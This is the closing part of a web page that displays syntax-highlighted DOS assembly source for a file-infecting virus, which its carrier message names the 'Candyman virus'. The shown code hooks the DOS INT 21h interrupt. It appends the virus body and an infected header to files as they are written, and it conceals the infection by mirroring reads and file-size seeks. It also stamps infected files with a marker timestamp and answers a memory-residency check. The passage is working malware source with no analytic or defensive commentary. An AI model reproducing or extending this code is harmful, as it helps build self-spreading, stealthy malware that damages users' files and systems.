                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Mirror_Above</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Check low word.</span><span class="sc0">
                </span><span class="sc6">JNA</span><span class="sc0">     </span><span class="sc5">Restore_Read</span><span class="sc0">

</span><span class="sc5">Mirror_Above</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">          </span><span class="sc1">; Calculate size of</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; mirrored host.</span><span class="sc0">

                </span><span class="sc1">; Check if the read ends before the end</span><span class="sc0">
                </span><span class="sc1">; of the virtual virusbody has reached.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; Check high word.</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">No_Adjust</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Do_Adjust</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Check low word.</span><span class="sc0">
                </span><span class="sc6">JNA</span><span class="sc0">     </span><span class="sc5">No_Adjust</span><span class="sc0">

</span><span class="sc5">Do_Adjust</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Read was over virusbody.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">No_Adjust</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">        </span><span class="sc1">; Restore position after</span><span class="sc0">
                                                </span><span class="sc1">; the caller's read.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">File_Pos_Lo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">         </span><span class="sc1">; Save new file-position.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">File_Pos_Hi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BP.Reg_DX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BP.Reg_AX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">BP.Reg_AX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Copy virusbody into</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">                   </span><span class="sc1">; caller's readbuffer.</span><span class="sc0">

</span><span class="sc5">Restore_Read</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

</span><span class="sc5">Exit_Mirror_R</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Mirror_S</span><span class="sc0">


</span><span class="sc1">; ============= FILE SEEK ===================================================</span><span class="sc0">

</span><span class="sc5">Check_4_Seek</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">               </span><span class="sc1">; Seek EOF ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_4_Write</span><span class="sc0">

</span><span class="sc5">Mirror_Seek</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Mirror_S</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle_Inf</span><span class="sc0">        </span><span class="sc1">; Handle appropriate for</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Mirror_S</span><span class="sc0">           </span><span class="sc1">; infection?</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">               </span><span class="sc1">; Add the virussize to EOF.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">BP.Reg_AX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Set new values in stack.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">BP.Reg_DX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

</span><span class="sc5">Exit_Mirror_S</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_RETF2</span><span class="sc0">


</span><span class="sc1">; ============= FILE WRITE ==================================================</span><span class="sc0">

</span><span class="sc5">Check_4_Write</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write file?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_4_TDate</span><span class="sc0">

                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle_Inf</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Abort_Routine</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_BOF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write the infected header.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Restore_Pos</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_EOF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Write the virusbody.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">CWD</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

</span><span class="sc5">Restore_Pos</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Restore_File_Pos</span><span class="sc0">

</span><span class="sc5">Exit_Mir_Write</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">               </span><span class="sc1">; Do the write.</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Do_RETF2</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">               </span><span class="sc1">; Get filedate &amp; time.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">               </span><span class="sc1">; Set infected timestamp.</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

</span><span class="sc5">Exit_RETF2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

</span><span class="sc5">Do_RETF2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">


</span><span class="sc1">; ============= GET FILE DATE &amp; TIME ========================================</span><span class="sc0">

</span><span class="sc5">Check_4_TDate</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">               </span><span class="sc1">; Get filedate &amp; time?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_4_Res</span><span class="sc0">

</span><span class="sc5">Mirror_F_Time</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Filetime</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Handle_Inf</span><span class="sc0">        </span><span class="sc1">; Handle OK for infection?</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Filetime</span><span class="sc0">

                </span><span class="sc1">; Set infected timestamp in the stack.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BP.Reg_CX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BP.Reg_CX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Exit_Filetime</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exit_Mirror_S</span><span class="sc0">


</span><span class="sc1">; ============= VIRUS RESIDENCY CHECK =======================================</span><span class="sc0">

</span><span class="sc5">Check_4_Res</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Residency_Check</span><span class="sc0">     </span><span class="sc1">; "Are-you-there-bro?" call?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">JMP_Int21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_Mem</span><span class="sc0">          </span><span class="sc1">; Yeah dude, here I am.</span><span class="sc0">

                </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">Abort_Routine</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

</span><span class="sc5">JMP_Int21h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                    </span><span class="sc1">; JMP FAR opcode.</span><span class="sc0">

</span><span class="sc5">Virus_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Int21h</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Header</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Virus_End_Mem</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc5">COM_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Jump</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Displacement</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">COM_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">EXE_Mark</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Marker valid .EXE-file: MZ or ZM.</span><span class="sc0">
</span><span class="sc5">Image_Mod_512</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Image_512_Pages</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reloc_Items</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Header_Size_Mem</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Min_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Max_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Checksum</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_IP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_CS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Offs_RelocTable</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Overlay_Number</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Undocumented</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Unused</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">FindFirstHandle</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Handle_Reserved</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Handle_Attr</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Handle_Time</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Handle_Date</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Handle_Size</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Handle_Name</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFirstHandle</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">FindFirst_FCB</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FCB_Drive</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Name</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FCB_Ext</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FCB_Attr</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Reserved</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FCB_Time</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Date</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Start_Clust</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FCB_Size</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFirst_FCB</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Push_All_Stack</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Reg_ES</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_DS</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_DI</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_SI</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_BP</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_SP</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_BX</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_DX</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_CX</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_AX</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_Flags</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reg_Ret_Addr</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Push_All_Stack</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">MCB_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">MCB_Type</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; M = not last block, Z = last block.</span><span class="sc0">
</span><span class="sc5">MCB_PSP</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; PSP-segment of this block.</span><span class="sc0">
</span><span class="sc5">MCB_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Size of block in paragraphs.</span><span class="sc0">
</span><span class="sc5">MCB_Dunno</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Don't care, don't need it.</span><span class="sc0">
</span><span class="sc5">MCB_Program</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Filename of program of this block.</span><span class="sc0">
</span><span class="sc5">MCB_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Carrier</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Carrier_Msg</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Carrier_Msg</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'File infected with Candyman virus!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">

                </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
